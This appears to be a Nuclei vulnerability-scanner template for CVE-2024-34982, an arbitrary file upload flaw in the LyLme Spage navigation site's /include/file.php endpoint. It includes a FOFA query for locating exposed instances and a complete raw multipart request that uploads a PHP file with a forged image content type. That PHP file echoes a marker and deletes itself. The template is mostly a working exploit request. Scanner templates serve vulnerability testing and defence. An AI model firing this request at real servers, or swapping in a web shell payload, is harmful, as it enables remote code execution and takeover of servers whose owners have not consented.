id: 60-navigation-filephp-arbitrary-file-upload

info:
  name: 六零导航页 file.php 接口任意文件上传漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title=="上网导航 - LyLme Spage"
          六零导航页 (LyLme Spage) 是一个提供简洁高效无广告上网导航和搜索入口的系统，支持后台链接管理及搜索引擎自定义，无商业推广。该系统在file.php接口中存在文件上传漏洞，攻击者可通过上传恶意文件实现远程代码执行，进而控制目标服务器。
  reference:
  - CVE-2024-34982
  tags: 六零导航页

http:
- raw:
  - |
    POST /include/file.php HTTP/1.1
    Host: {{Hostname}}
    Connection: close
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: multipart/form-data; boundary=---------------------------qttl7vemrsold314zg0f
    X-Requested-With: XMLHttpRequest

    -----------------------------qttl7vemrsold314zg0f
    Content-Disposition: form-data; name="file"; filename="NTest.php"
    Content-Type: image/png

    <?php echo 'NdayTest'; unlink(__FILE__); ?>
    -----------------------------qttl7vemrsold314zg0f--
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - '上传成功'
